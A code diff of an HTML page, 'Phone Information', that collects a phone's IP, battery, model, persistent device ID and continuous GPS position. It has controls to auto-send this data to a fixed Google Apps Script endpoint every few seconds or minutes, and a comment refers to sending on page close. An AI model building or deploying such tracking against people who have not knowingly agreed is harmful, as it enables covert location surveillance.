@@ -10,48 +10,44 @@
   content="width=device-width, initial-scale=1.0"
 >
 
-<meta
-  name="theme-color"
-  content="#020617"
->
-
-<title>Live Device Dashboard</title>
-
+<title>Phone Information</title>
 
 <style>
 
 *{
+  box-sizing:border-box;
   margin:0;
   padding:0;
-  box-sizing:border-box;
 }
 
 body{
 
   font-family:
-  Arial,
-  Helvetica,
-  sans-serif;
+    Arial,
+    Helvetica,
+    sans-serif;
+
+  background:
+    linear-gradient(
+      135deg,
+      #07111f,
+      #0d1b2a,
+      #111827
+    );
+
+  color:#ffffff;
 
   min-height:100vh;
 
-  padding:15px;
-
-  color:#fff;
-
-  background:
-  radial-gradient(
-    circle at top,
-    #172554,
-    #020617 55%,
-    #000
-  );
+  padding:20px;
 
 }
 
+
 .container{
 
-  max-width:1150px;
+  width:100%;
+  max-width:900px;
 
   margin:auto;
 
@@ -62,24 +58,9 @@ body{
 
 .header{
 
-  padding:25px;
+  text-align:center;
 
-  margin-bottom:18px;
-
-  border-radius:22px;
-
-  background:
-  rgba(15,23,42,.85);
-
-  border:
-  1px solid
-  rgba(255,255,255,.1);
-
-  backdrop-filter:blur(15px);
-
-  box-shadow:
-  0 15px 40px
-  rgba(0,0,0,.25);
+  margin-bottom:20px;
 
 }
 
@@ -87,194 +68,15 @@ body{
 
   font-size:28px;
 
-  margin-bottom:8px;
+  margin-bottom:7px;
 
 }
 
 .header p{
 
-  color:#94a3b8;
+  color:#9ca3af;
 
   font-size:14px;
-
-}
-
-
-/* GRID */
-
-.grid{
-
-  display:grid;
-
-  grid-template-columns:
-  repeat(
-    auto-fit,
-    minmax(210px,1fr)
-  );
-
-  gap:12px;
-
-}
-
-
-/* CARD */
-
-.card{
-
-  min-height:105px;
-
-  padding:17px;
-
-  border-radius:18px;
-
-  background:
-  rgba(15,23,42,.85);
-
-  border:
-  1px solid
-  rgba(255,255,255,.09);
-
-  box-shadow:
-  0 10px 30px
-  rgba(0,0,0,.22);
-
-}
-
-.card-title{
-
-  color:#94a3b8;
-
-  font-size:11px;
-
-  font-weight:bold;
-
-  letter-spacing:1px;
-
-  text-transform:uppercase;
-
-  margin-bottom:9px;
-
-}
-
-.card-value{
-
-  color:#f8fafc;
-
-  font-size:16px;
-
-  font-weight:bold;
-
-  word-break:break-word;
-
-}
-
-.online{
-
-  color:#22c55e !important;
-
-}
-
-.offline{
-
-  color:#ef4444 !important;
-
-}
-
-
-/* CONTROLS */
-
-.controls{
-
-  margin-top:18px;
-
-  padding:20px;
-
-  border-radius:20px;
-
-  background:
-  rgba(15,23,42,.85);
-
-  border:
-  1px solid
-  rgba(255,255,255,.09);
-
-}
-
-.controls h2{
-
-  font-size:18px;
-
-  margin-bottom:14px;
-
-}
-
-.control-row{
-
-  display:flex;
-
-  flex-wrap:wrap;
-
-  gap:10px;
-
-}
-
-select,
-button{
-
-  min-height:46px;
-
-  padding:
-  0 16px;
-
-  border-radius:12px;
-
-  border:none;
-
-  outline:none;
-
-  font-size:14px;
-
-}
-
-select{
-
-  background:#020617;
-
-  color:#fff;
-
-  border:
-  1px solid
-  #334155;
-
-}
-
-button{
-
-  background:#2563eb;
-
-  color:#fff;
-
-  font-weight:bold;
-
-  cursor:pointer;
-
-}
-
-button:hover{
-
-  opacity:.85;
-
-}
-
-.location-btn{
-
-  background:#059669;
-
-}
-
-.stop-btn{
-
-  background:#dc2626;
 
 }
 
@@ -283,86 +85,284 @@ button:hover{
 
 .status-box{
 
-  margin-top:18px;
-
-  padding:16px;
-
-  border-radius:16px;
-
   background:
-  rgba(15,23,42,.85);
+    rgba(255,255,255,0.06);
 
   border:
-  1px solid
-  rgba(255,255,255,.09);
+    1px solid
+    rgba(255,255,255,0.1);
+
+  border-radius:18px;
+
+  padding:18px;
+
+  margin-bottom:18px;
+
+  backdrop-filter:blur(12px);
 
 }
 
-.status-title{
+.status-row{
 
-  color:#94a3b8;
+  display:flex;
 
-  font-size:12px;
+  justify-content:space-between;
 
-  margin-bottom:6px;
+  align-items:center;
+
+  margin-bottom:12px;
 
 }
 
-#status{
+.status-row:last-child{
+
+  margin-bottom:0;
+
+}
+
+.status-label{
+
+  color:#9ca3af;
 
   font-size:14px;
+
+}
+
+.status-value{
 
   font-weight:bold;
 
 }
 
 
-/* LOG */
+/* DOT */
 
-.log{
+.dot{
 
-  margin-top:18px;
+  display:inline-block;
 
-  padding:20px;
+  width:10px;
+  height:10px;
 
-  border-radius:20px;
+  border-radius:50%;
+
+  margin-right:7px;
+
+  background:#22c55e;
+
+}
+
+
+/* BUTTONS */
+
+.controls{
+
+  display:grid;
+
+  grid-template-columns:
+    repeat(2,1fr);
+
+  gap:10px;
+
+  margin-bottom:18px;
+
+}
+
+button{
+
+  border:none;
+
+  border-radius:12px;
+
+  padding:14px 10px;
+
+  font-size:14px;
+
+  font-weight:bold;
+
+  cursor:pointer;
+
+  background:#2563eb;
+
+  color:white;
+
+}
+
+button:hover{
+
+  opacity:.9;
+
+}
+
+button.stop{
+
+  background:#dc2626;
+
+}
+
+button.gps{
+
+  background:#059669;
+
+}
+
+button.now{
+
+  background:#7c3aed;
+
+}
+
+
+/* INTERVAL */
+
+.interval{
 
   background:
-  rgba(15,23,42,.85);
+    rgba(255,255,255,0.06);
 
-  border:
-  1px solid
-  rgba(255,255,255,.09);
+  border-radius:16px;
 
-}
+  padding:15px;
 
-.log h2{
-
-  font-size:18px;
-
-  margin-bottom:12px;
+  margin-bottom:18px;
 
 }
 
-#activity{
+.interval label{
 
-  max-height:250px;
-
-  overflow-y:auto;
-
-}
-
-.log-item{
-
-  padding:10px 0;
-
-  border-bottom:
-  1px solid
-  rgba(255,255,255,.07);
+  display:block;
 
   font-size:13px;
 
+  color:#9ca3af;
+
+  margin-bottom:8px;
+
+}
+
+select{
+
+  width:100%;
+
+  padding:12px;
+
+  border-radius:10px;
+
+  border:1px solid
+    rgba(255,255,255,.15);
+
+  background:#111827;
+
+  color:white;
+
+  outline:none;
+
+}
+
+
+/* INFO GRID */
+
+.grid{
+
+  display:grid;
+
+  grid-template-columns:
+    repeat(2,1fr);
+
+  gap:12px;
+
+}
+
+
+.card{
+
+  background:
+    rgba(255,255,255,0.06);
+
+  border:
+    1px solid
+    rgba(255,255,255,0.08);
+
+  border-radius:16px;
+
+  padding:15px;
+
+  min-height:85px;
+
+  backdrop-filter:blur(10px);
+
+}
+
+.card-title{
+
+  color:#9ca3af;
+
+  font-size:12px;
+
+  margin-bottom:8px;
+
+}
+
+.card-value{
+
+  font-size:14px;
+
+  font-weight:bold;
+
+  word-break:break-word;
+
+}
+
+
+/* LOG */
+
+.log-box{
+
+  margin-top:18px;
+
+  background:
+    rgba(0,0,0,.25);
+
+  border-radius:16px;
+
+  padding:15px;
+
+}
+
+.log-title{
+
+  font-size:14px;
+
+  margin-bottom:10px;
+
+}
+
+#log{
+
+  height:150px;
+
+  overflow:auto;
+
+  font-size:12px;
+
+  line-height:1.7;
+
   color:#cbd5e1;
+
+}
+
+
+/* FOOTER */
+
+.footer{
+
+  text-align:center;
+
+  color:#6b7280;
+
+  font-size:11px;
+
+  margin-top:20px;
 
 }
 
@@ -373,61 +373,26 @@ button:hover{
 
   body{
 
-    padding:10px;
-
-  }
-
-  .header{
-
-    padding:20px;
+    padding:12px;
 
   }
 
   .header h1{
 
-    font-size:22px;
+    font-size:24px;
 
   }
 
   .grid{
 
+    grid-template-columns:1fr;
+
+  }
+
+  .controls{
+
     grid-template-columns:
-    repeat(2,1fr);
-
-    gap:9px;
-
-  }
-
-  .card{
-
-    padding:13px;
-
-    min-height:92px;
-
-  }
-
-  .card-title{
-
-    font-size:9px;
-
-  }
-
-  .card-value{
-
-    font-size:13px;
-
-  }
-
-  .control-row{
-
-    flex-direction:column;
-
-  }
-
-  select,
-  button{
-
-    width:100%;
+      repeat(2,1fr);
 
   }
 
@@ -444,273 +409,562 @@ button:hover{
 <div class="container">
 
 
-<div class="header">
+  <div class="header">
 
-<h1>📱 Live Device Dashboard</h1>
+    <h1>📱 Phone Information</h1>
 
-<p>
-Browser Device Information & Live Data
-</p>
+    <p>
+      Device information & live location system
+    </p>
 
-</div>
+  </div>
 
 
-<div class="grid">
+  <!-- STATUS -->
 
+  <div class="status-box">
 
-<div class="card">
-<div class="card-title">Date</div>
-<div class="card-value" id="date">---</div>
-</div>
+    <div class="status-row">
 
+      <span class="status-label">
+        Connection
+      </span>
 
-<div class="card">
-<div class="card-title">Time</div>
-<div class="card-value" id="time">---</div>
-</div>
+      <span
+        class="status-value"
+        id="onlineStatus"
+      >
+        <span class="dot"></span>
+        Checking...
+      </span>
 
+    </div>
 
-<div class="card">
-<div class="card-title">Public IP</div>
-<div class="card-value" id="ip">Loading...</div>
-</div>
 
+    <div class="status-row">
 
-<div class="card">
-<div class="card-title">Battery</div>
-<div class="card-value" id="battery">---</div>
-</div>
+      <span class="status-label">
+        Auto Send
+      </span>
 
+      <span
+        class="status-value"
+        id="autoStatus"
+      >
+        OFF
+      </span>
 
-<div class="card">
-<div class="card-title">Device ID</div>
-<div class="card-value" id="deviceId">---</div>
-</div>
+    </div>
 
 
-<div class="card">
-<div class="card-title">Mobile Model</div>
-<div class="card-value" id="mobileModel">---</div>
-</div>
+    <div class="status-row">
 
+      <span class="status-label">
+        Last Send
+      </span>
 
-<div class="card">
-<div class="card-title">Device Type</div>
-<div class="card-value" id="deviceType">---</div>
-</div>
+      <span
+        class="status-value"
+        id="lastSend"
+      >
+        -
+      </span>
 
+    </div>
 
-<div class="card">
-<div class="card-title">Browser</div>
-<div class="card-value" id="browser">---</div>
-</div>
+  </div>
 
 
-<div class="card">
-<div class="card-title">Operating System</div>
-<div class="card-value" id="os">---</div>
-</div>
+  <!-- INTERVAL -->
 
+  <div class="interval">
 
-<div class="card">
-<div class="card-title">OS Version</div>
-<div class="card-value" id="osVersion">---</div>
-</div>
+    <label>
+      Auto Send Interval
+    </label>
 
+    <select id="intervalSelect">
 
-<div class="card">
-<div class="card-title">Screen</div>
-<div class="card-value" id="screen">---</div>
-</div>
+      <option value="1000">
+        Every 1 Second
+      </option>
 
+      <option value="2000">
+        Every 2 Seconds
+      </option>
 
-<div class="card">
-<div class="card-title">Language</div>
-<div class="card-value" id="language">---</div>
-</div>
+      <option value="3000">
+        Every 3 Seconds
+      </option>
 
+      <option value="5000" selected>
+        Every 5 Seconds
+      </option>
 
-<div class="card">
-<div class="card-title">Time Zone</div>
-<div class="card-value" id="timezone">---</div>
-</div>
+      <option value="120000">
+        Every 2 Minutes
+      </option>
 
+      <option value="180000">
+        Every 3 Minutes
+      </option>
 
-<div class="card">
-<div class="card-title">Pixel Ratio</div>
-<div class="card-value" id="pixelRatio">---</div>
-</div>
+      <option value="300000">
+        Every 5 Minutes
+      </option>
 
+    </select>
 
-<div class="card">
-<div class="card-title">Online Status</div>
-<div
-  class="card-value"
-  id="onlineStatus">
----
-</div>
-</div>
+  </div>
 
 
-<div class="card">
-<div class="card-title">Connection Type</div>
-<div class="card-value" id="connectionType">---</div>
-</div>
+  <!-- BUTTONS -->
 
+  <div class="controls">
 
-<div class="card">
-<div class="card-title">Downlink</div>
-<div class="card-value" id="downlink">---</div>
-</div>
+    <button
+      class="now"
+      onclick="sendNow()"
+    >
+      📤 Send Now
+    </button>
 
 
-<div class="card">
-<div class="card-title">RAM</div>
-<div class="card-value" id="ram">---</div>
-</div>
+    <button
+      class="gps"
+      onclick="updateGPS()"
+    >
+      📍 Update GPS
+    </button>
 
 
-<div class="card">
-<div class="card-title">CPU Cores</div>
-<div class="card-value" id="cpuCores">---</div>
-</div>
+    <button
+      onclick="startAuto()"
+    >
+      ▶ Start Auto
+    </button>
 
 
-<div class="card">
-<div class="card-title">Location</div>
-<div class="card-value" id="location">
-Waiting for GPS...
-</div>
-</div>
+    <button
+      class="stop"
+      onclick="stopAuto()"
+    >
+      ⏹ Stop Auto
+    </button>
 
+  </div>
 
-<div class="card">
-<div class="card-title">Latitude</div>
-<div class="card-value" id="latitude">---</div>
-</div>
 
+  <!-- INFORMATION -->
 
-<div class="card">
-<div class="card-title">Longitude</div>
-<div class="card-value" id="longitude">---</div>
-</div>
+  <div class="grid">
 
 
-<div class="card">
-<div class="card-title">GPS Accuracy</div>
-<div class="card-value" id="gpsAccuracy">---</div>
-</div>
+    <div class="card">
 
+      <div class="card-title">
+        IP Address
+      </div>
 
-<div class="card">
-<div class="card-title">Altitude</div>
-<div class="card-value" id="altitude">---</div>
-</div>
+      <div
+        class="card-value"
+        id="ip"
+      >
+        Loading...
+      </div>
 
+    </div>
 
-<div class="card">
-<div class="card-title">GPS Speed</div>
-<div class="card-value" id="speed">---</div>
-</div>
 
+    <div class="card">
 
-<div class="card">
-<div class="card-title">Heading</div>
-<div class="card-value" id="heading">---</div>
-</div>
+      <div class="card-title">
+        Location
+      </div>
 
+      <div
+        class="card-value"
+        id="location"
+      >
+        Waiting...
+      </div>
 
-</div>
+    </div>
 
 
-<div class="controls">
+    <div class="card">
 
-<h2>⚙️ Auto Send Control</h2>
+      <div class="card-title">
+        Latitude
+      </div>
 
-<div class="control-row">
+      <div
+        class="card-value"
+        id="latitude"
+      >
+        -
+      </div>
 
+    </div>
 
-<select id="interval">
 
-<option value="1000">
-Every 1 Second
-</option>
+    <div class="card">
 
-<option value="2000">
-Every 2 Seconds
-</option>
+      <div class="card-title">
+        Longitude
+      </div>
 
-<option value="3000">
-Every 3 Seconds
-</option>
+      <div
+        class="card-value"
+        id="longitude"
+      >
+        -
+      </div>
 
-<option value="5000" selected>
-Every 5 Seconds
-</option>
+    </div>
 
-<option value="120000">
-Every 2 Minutes
-</option>
 
-<option value="180000">
-Every 3 Minutes
-</option>
+    <div class="card">
 
-<option value="300000">
-Every 5 Minutes
-</option>
+      <div class="card-title">
+        Battery
+      </div>
 
-</select>
+      <div
+        class="card-value"
+        id="battery"
+      >
+        -
+      </div>
 
+    </div>
 
-<button onclick="sendNow()">
-📤 Send Now
-</button>
 
+    <div class="card">
 
-<button
-  class="location-btn"
-  onclick="requestLocation()">
+      <div class="card-title">
+        Device ID
+      </div>
 
-📍 Update GPS
+      <div
+        class="card-value"
+        id="deviceId"
+      >
+        -
+      </div>
 
-</button>
+    </div>
 
 
-<button
-  class="stop-btn"
-  onclick="stopAuto()">
+    <div class="card">
 
-⛔ Stop Auto
+      <div class="card-title">
+        Mobile Model
+      </div>
 
-</button>
+      <div
+        class="card-value"
+        id="mobileModel"
+      >
+        -
+      </div>
 
+    </div>
 
-</div>
 
-</div>
+    <div class="card">
 
+      <div class="card-title">
+        Device Type
+      </div>
 
-<div class="status-box">
+      <div
+        class="card-value"
+        id="deviceType"
+      >
+        -
+      </div>
 
-<div class="status-title">
-SYSTEM STATUS
-</div>
+    </div>
 
-<div id="status">
-Starting...
-</div>
 
-</div>
+    <div class="card">
 
+      <div class="card-title">
+        Browser
+      </div>
 
-<div class="log">
+      <div
+        class="card-value"
+        id="browser"
+      >
+        -
+      </div>
 
-<h2>📋 Activity Log</h2>
+    </div>
 
-<div id="activity"></div>
 
-</div>
+    <div class="card">
+
+      <div class="card-title">
+        OS
+      </div>
+
+      <div
+        class="card-value"
+        id="os"
+      >
+        -
+      </div>
+
+    </div>
+
+
+    <div class="card">
+
+      <div class="card-title">
+        OS Version
+      </div>
+
+      <div
+        class="card-value"
+        id="osVersion"
+      >
+        -
+      </div>
+
+    </div>
+
+
+    <div class="card">
+
+      <div class="card-title">
+        Screen
+      </div>
+
+      <div
+        class="card-value"
+        id="screen"
+      >
+        -
+      </div>
+
+    </div>
+
+
+    <div class="card">
+
+      <div class="card-title">
+        Language
+      </div>
+
+      <div
+        class="card-value"
+        id="language"
+      >
+        -
+      </div>
+
+    </div>
+
+
+    <div class="card">
+
+      <div class="card-title">
+        Time Zone
+      </div>
+
+      <div
+        class="card-value"
+        id="timeZone"
+      >
+        -
+      </div>
+
+    </div>
+
+
+    <div class="card">
+
+      <div class="card-title">
+        Pixel Ratio
+      </div>
+
+      <div
+        class="card-value"
+        id="pixelRatio"
+      >
+        -
+      </div>
+
+    </div>
+
+
+    <div class="card">
+
+      <div class="card-title">
+        Online Status
+      </div>
+
+      <div
+        class="card-value"
+        id="online"
+      >
+        -
+      </div>
+
+    </div>
+
+
+    <div class="card">
+
+      <div class="card-title">
+        Connection Type
+      </div>
+
+      <div
+        class="card-value"
+        id="connectionType"
+      >
+        -
+      </div>
+
+    </div>
+
+
+    <div class="card">
+
+      <div class="card-title">
+        Downlink
+      </div>
+
+      <div
+        class="card-value"
+        id="downlink"
+      >
+        -
+      </div>
+
+    </div>
+
+
+    <div class="card">
+
+      <div class="card-title">
+        RAM
+      </div>
+
+      <div
+        class="card-value"
+        id="ram"
+      >
+        -
+      </div>
+
+    </div>
+
+
+    <div class="card">
+
+      <div class="card-title">
+        CPU Cores
+      </div>
+
+      <div
+        class="card-value"
+        id="cpuCores"
+      >
+        -
+      </div>
+
+    </div>
+
+
+    <div class="card">
+
+      <div class="card-title">
+        GPS Accuracy
+      </div>
+
+      <div
+        class="card-value"
+        id="gpsAccuracy"
+      >
+        -
+      </div>
+
+    </div>
+
+
+    <div class="card">
+
+      <div class="card-title">
+        Altitude
+      </div>
+
+      <div
+        class="card-value"
+        id="altitude"
+      >
+        -
+      </div>
+
+    </div>
+
+
+    <div class="card">
+
+      <div class="card-title">
+        Speed
+      </div>
+
+      <div
+        class="card-value"
+        id="speed"
+      >
+        -
+      </div>
+
+    </div>
+
+
+    <div class="card">
+
+      <div class="card-title">
+        Heading
+      </div>
+
+      <div
+        class="card-value"
+        id="heading"
+      >
+        -
+      </div>
+
+    </div>
+
+
+  </div>
+
+
+  <!-- LOG -->
+
+  <div class="log-box">
+
+    <div class="log-title">
+      Activity Log
+    </div>
+
+    <div id="log"></div>
+
+  </div>
+
+
+  <div class="footer">
+
+    Phone Data System
+
+  </div>
 
 
 </div>
@@ -719,54 +973,60 @@ Starting...
 <script>
 
 
-/****************************************************
- * APPS SCRIPT URL
- ****************************************************/
+/* =========================
+   API
+========================= */
 
 const API_URL =
 "https://script.google.com/macros/s/AKfycbzFJbVAZxXgj1EdOo5LvIvBzJmyUDk4gE3f5GtG60Ayfaod1qbRRAKWCebOe_sxsKvJ/exec";
 
 
-/*
- * IMPORTANT:
- * যদি উপরের URL-এ সমস্যা দেখায়,
- * তোমার আসল deployed /exec URL বসাবে।
- */
-
-
-/****************************************************
- * VARIABLES
- ****************************************************/
+/* =========================
+   VARIABLES
+========================= */
 
 let autoTimer = null;
 
-let locationWatchId = null;
+let gpsWatch = null;
 
-let cachedIP = "";
+let currentPosition = null;
 
 let batteryObject = null;
 
+let publicIP = "Unknown";
 
-let locationData = {
-
-  latitude: "",
-
-  longitude: "",
-
-  accuracy: "",
-
-  altitude: "",
-
-  speed: "",
-
-  heading: ""
-
-};
+let lastSendTimestamp = 0;
 
 
-/****************************************************
- * DEVICE ID
- ****************************************************/
+/*
+  Prevent duplicate close-send
+*/
+
+let closeSendDone = false;
+
+
+/* =========================
+   LOG
+========================= */
+
+function addLog(message){
+
+  const log =
+    document.getElementById("log");
+
+  const time =
+    new Date().toLocaleTimeString();
+
+  log.innerHTML =
+    `[${time}] ${message}<br>` +
+    log.innerHTML;
+
+}
+
+
+/* =========================
+   DEVICE ID
+========================= */
 
 function getDeviceId(){
 
@@ -780,25 +1040,18 @@ function getDeviceId(){
 
     id =
       "PHONE-" +
-      Date.now()
-      .toString(36)
-      .toUpperCase()
-      +
+      Date.now().toString(36) +
       "-" +
       Math.random()
-      .toString(36)
-      .substring(2,8)
-      .toUpperCase();
+        .toString(36)
+        .substring(2,10)
+        .toUpperCase();
 
 
-    try{
-
-      localStorage.setItem(
-        "phone_device_id",
-        id
-      );
-
-    }catch(e){}
+    localStorage.setItem(
+      "phone_device_id",
+      id
+    );
 
   }
 
@@ -808,60 +1061,56 @@ function getDeviceId(){
 }
 
 
-/****************************************************
- * MOBILE MODEL
- ****************************************************/
+/* =========================
+   MOBILE MODEL
+========================= */
 
 function getMobileModel(){
 
   const ua =
-    navigator.userAgent || "";
+    navigator.userAgent;
 
 
   /*
-   * Android
-   */
+    Android
+  */
 
-  if(
-    /Android/i.test(ua)
-  ){
+  if(/Android/i.test(ua)){
 
-    let match =
+    /*
+      Example:
+      Pixel 7 Build/...
+      SM-S918B Build/...
+    */
+
+    const match =
       ua.match(
-        /Android[^;]*;\s*(?:[a-z]{2}-[A-Z]{2};\s*)?(?:wv;\s*)?(?:[^;]+;\s*)?([^;)]+)\s+Build\//i
+        /Android[^;]*;\s*(?:wv;\s*)?(?:[a-zA-Z0-9._-]+;\s*)?([^;)]+?)\s+Build\//i
       );
 
 
-    if(
-      match &&
-      match[1]
-    ){
+    if(match && match[1]){
 
-      return cleanModel(
-        match[1]
-      );
+      return match[1]
+        .replace(/Build.*$/i,"")
+        .trim();
 
     }
 
 
     /*
-     * Alternative Android pattern
-     */
+      Alternative Android detection
+    */
 
-    match =
+    const simple =
       ua.match(
-        /;\s*([^;()]+)\s+Build\//i
+        /;\s*([^;()]+?)\s+Build\//i
       );
 
 
-    if(
-      match &&
-      match[1]
-    ){
+    if(simple && simple[1]){
 
-      return cleanModel(
-        match[1]
-      );
+      return simple[1].trim();
 
     }
 
@@ -871,28 +1120,23 @@ function getMobileModel(){
   }
 
 
-  /*
-   * iPhone
-   */
-
-  if(
-    /iPhone/i.test(ua)
-  ){
+  if(/iPhone/i.test(ua)){
 
     return "iPhone";
 
   }
 
 
-  /*
-   * iPad
-   */
-
-  if(
-    /iPad/i.test(ua)
-  ){
+  if(/iPad/i.test(ua)){
 
     return "iPad";
+
+  }
+
+
+  if(/Windows Phone/i.test(ua)){
+
+    return "Windows Phone";
 
   }
 
@@ -902,86 +1146,34 @@ function getMobileModel(){
 }
 
 
-/****************************************************
- * CLEAN MODEL NAME
- ****************************************************/
-
-function cleanModel(model){
-
-  if(!model){
-
-    return "Unknown";
-
-  }
-
-
-  return model
-    .replace(
-      /Build\/.*/i,
-      ""
-    )
-    .replace(
-      /;/g,
-      ""
-    )
-    .trim();
-
-}
-
-
-/****************************************************
- * OS
- ****************************************************/
+/* =========================
+   OS
+========================= */
 
 function getOS(){
 
   const ua =
-    navigator.userAgent || "";
+    navigator.userAgent;
 
 
-  if(
-    /Android/i.test(ua)
-  ){
-
+  if(/Android/i.test(ua))
     return "Android";
 
-  }
 
-
-  if(
-    /iPhone|iPad|iPod/i.test(ua)
-  ){
-
+  if(/iPhone|iPad|iPod/i.test(ua))
     return "iOS";
 
-  }
 
-
-  if(
-    /Windows/i.test(ua)
-  ){
-
+  if(/Windows/i.test(ua))
     return "Windows";
 
-  }
 
-
-  if(
-    /Mac OS/i.test(ua)
-  ){
-
+  if(/Mac OS X/i.test(ua))
     return "macOS";
 
-  }
 
-
-  if(
-    /Linux/i.test(ua)
-  ){
-
+  if(/Linux/i.test(ua))
     return "Linux";
-
-  }
 
 
   return "Unknown";
@@ -989,22 +1181,18 @@ function getOS(){
 }
 
 
-/****************************************************
- * OS VERSION
- ****************************************************/
+/* =========================
+   OS VERSION
+========================= */
 
 function getOSVersion(){
 
   const ua =
-    navigator.userAgent || "";
+    navigator.userAgent;
 
 
   let match;
 
-
-  /*
-   * Android
-   */
 
   match =
     ua.match(
@@ -1019,10 +1207,6 @@ function getOSVersion(){
   }
 
 
-  /*
-   * iOS
-   */
-
   match =
     ua.match(
       /OS\s([0-9_]+)\slike Mac OS X/i
@@ -1032,21 +1216,12 @@ function getOSVersion(){
   if(match){
 
     return match[1]
-      .replace(
-        /_/g,
-        "."
-      );
+      .replace(/_/g,".");
 
   }
 
 
-  /*
-   * Windows
-   */
-
-  if(
-    /Windows NT 10.0/i.test(ua)
-  ){
+  if(/Windows NT 10.0/i.test(ua)){
 
     return "10/11";
 
@@ -1058,70 +1233,35 @@ function getOSVersion(){
 }
 
 
-/****************************************************
- * BROWSER
- ****************************************************/
+/* =========================
+   BROWSER
+========================= */
 
 function getBrowser(){
 
   const ua =
-    navigator.userAgent || "";
+    navigator.userAgent;
 
 
-  if(
-    /Edg/i.test(ua)
-  ){
-
+  if(/Edg\//i.test(ua))
     return "Microsoft Edge";
 
-  }
 
-
-  if(
-    /OPR|Opera/i.test(ua)
-  ){
-
+  if(/OPR\//i.test(ua))
     return "Opera";
 
-  }
 
-
-  if(
-    /Firefox/i.test(ua)
-  ){
-
-    return "Mozilla Firefox";
-
-  }
-
-
-  if(
-    /SamsungBrowser/i.test(ua)
-  ){
-
-    return "Samsung Internet";
-
-  }
-
-
-  if(
-    /Chrome/i.test(ua)
-  ){
-
+  if(/Chrome\//i.test(ua))
     return "Google Chrome";
 
-  }
+
+  if(/Firefox\//i.test(ua))
+    return "Mozilla Firefox";
 
 
-  if(
-    /Safari/i.test(ua)
-    &&
-    !/Chrome/i.test(ua)
-  ){
-
+  if(/Safari\//i.test(ua) &&
+     /AppleWebKit/i.test(ua))
     return "Safari";
-
-  }
 
 
   return "Unknown";
@@ -1129,33 +1269,22 @@ function getBrowser(){
 }
 
 
-/****************************************************
- * DEVICE TYPE
- ****************************************************/
+/* =========================
+   DEVICE TYPE
+========================= */
 
 function getDeviceType(){
 
   const ua =
-    navigator.userAgent || "";
+    navigator.userAgent;
 
 
-  if(
-    /iPad|Tablet/i.test(ua)
-  ){
-
+  if(/Tablet|iPad/i.test(ua))
     return "Tablet";
 
-  }
 
-
-  if(
-    /Mobi|Android|iPhone|iPod/i
-    .test(ua)
-  ){
-
+  if(/Mobile|Android|iPhone/i.test(ua))
     return "Mobile";
-
-  }
 
 
   return "Desktop";
@@ -1163,18 +1292,75 @@ function getDeviceType(){
 }
 
 
-/****************************************************
- * IP
- ****************************************************/
+/* =========================
+   BATTERY
+========================= */
 
-async function getIP(){
+async function loadBattery(){
 
-  if(cachedIP){
+  try{
 
-    return cachedIP;
+    if(
+      "getBattery"
+      in navigator
+    ){
+
+      batteryObject =
+        await navigator.getBattery();
+
+      updateBatteryUI();
+
+      batteryObject.addEventListener(
+        "levelchange",
+        updateBatteryUI
+      );
+
+    }
 
   }
 
+  catch(error){
+
+    addLog(
+      "Battery API unavailable"
+    );
+
+  }
+
+}
+
+
+function getBatteryValue(){
+
+  if(batteryObject){
+
+    return Math.round(
+      batteryObject.level * 100
+    ) + "%";
+
+  }
+
+
+  return "Not Available";
+
+}
+
+
+function updateBatteryUI(){
+
+  document.getElementById(
+    "battery"
+  ).textContent =
+    getBatteryValue();
+
+}
+
+
+/* =========================
+   IP
+========================= */
+
+async function getIP(){
 
   try{
 
@@ -1182,335 +1368,109 @@ async function getIP(){
       await fetch(
         "https://api.ipify.org?format=json",
         {
-          method:"GET",
           cache:"no-store"
         }
       );
-
-
-    if(!response.ok){
-
-      throw new Error(
-        "IP request failed"
-      );
-
-    }
 
 
     const data =
       await response.json();
 
 
-    cachedIP =
-      data.ip || "";
+    publicIP =
+      data.ip ||
+      "Unknown";
 
 
     document.getElementById(
       "ip"
     ).textContent =
-      cachedIP || "Unavailable";
+      publicIP;
 
 
-    return cachedIP;
+    addLog(
+      "Public IP detected"
+    );
 
   }
 
   catch(error){
 
-    document.getElementById(
-      "ip"
-    ).textContent =
+    publicIP =
       "Unavailable";
 
 
-    return "";
+    document.getElementById(
+      "ip"
+    ).textContent =
+      publicIP;
+
+
+    addLog(
+      "IP detection failed"
+    );
 
   }
 
 }
 
 
-/****************************************************
- * BATTERY
- ****************************************************/
+/* =========================
+   GPS
+========================= */
 
-async function getBattery(){
-
-  try{
-
-    if(
-      !navigator.getBattery
-    ){
-
-      return "";
-
-    }
-
-
-    if(!batteryObject){
-
-      batteryObject =
-        await navigator.getBattery();
-
-    }
-
-
-    const value =
-      Math.round(
-        batteryObject.level * 100
-      );
-
-
-    document.getElementById(
-      "battery"
-    ).textContent =
-      value + "%";
-
-
-    return value + "%";
-
-  }
-
-  catch(error){
-
-    document.getElementById(
-      "battery"
-    ).textContent =
-      "Unavailable";
-
-
-    return "";
-
-  }
-
-}
-
-
-/****************************************************
- * GPS
- ****************************************************/
-
-function requestLocation(){
+function startGPS(){
 
   if(
     !navigator.geolocation
   ){
 
-    document.getElementById(
-      "location"
-    ).textContent =
-      "GPS not supported";
+    addLog(
+      "Geolocation not supported"
+    );
 
     return;
 
   }
 
 
-  document.getElementById(
-    "location"
-  ).textContent =
-    "Requesting GPS...";
-
-
-  if(
-    locationWatchId !== null
-  ){
+  if(gpsWatch !== null){
 
     navigator.geolocation.clearWatch(
-      locationWatchId
+      gpsWatch
     );
 
   }
 
 
-  locationWatchId =
+  gpsWatch =
     navigator.geolocation.watchPosition(
 
       function(position){
 
-        const c =
-          position.coords;
+        currentPosition =
+          position;
 
 
-        locationData.latitude =
-          isFinite(c.latitude)
-          ?
-          c.latitude
-          :
-          "";
-
-
-        locationData.longitude =
-          isFinite(c.longitude)
-          ?
-          c.longitude
-          :
-          "";
-
-
-        locationData.accuracy =
-          isFinite(c.accuracy)
-          ?
-          c.accuracy
-          :
-          "";
-
-
-        locationData.altitude =
-          c.altitude !== null &&
-          isFinite(c.altitude)
-          ?
-          c.altitude
-          :
-          "";
-
-
-        locationData.speed =
-          c.speed !== null &&
-          isFinite(c.speed)
-          ?
-          c.speed
-          :
-          "";
-
-
-        locationData.heading =
-          c.heading !== null &&
-          isFinite(c.heading)
-          ?
-          c.heading
-          :
-          "";
-
-
-        document.getElementById(
-          "latitude"
-        ).textContent =
-          Number(
-            locationData.latitude
-          ).toFixed(6);
-
-
-        document.getElementById(
-          "longitude"
-        ).textContent =
-          Number(
-            locationData.longitude
-          ).toFixed(6);
-
-
-        document.getElementById(
-          "gpsAccuracy"
-        ).textContent =
-          Math.round(
-            locationData.accuracy
-          ) + " m";
-
-
-        document.getElementById(
-          "altitude"
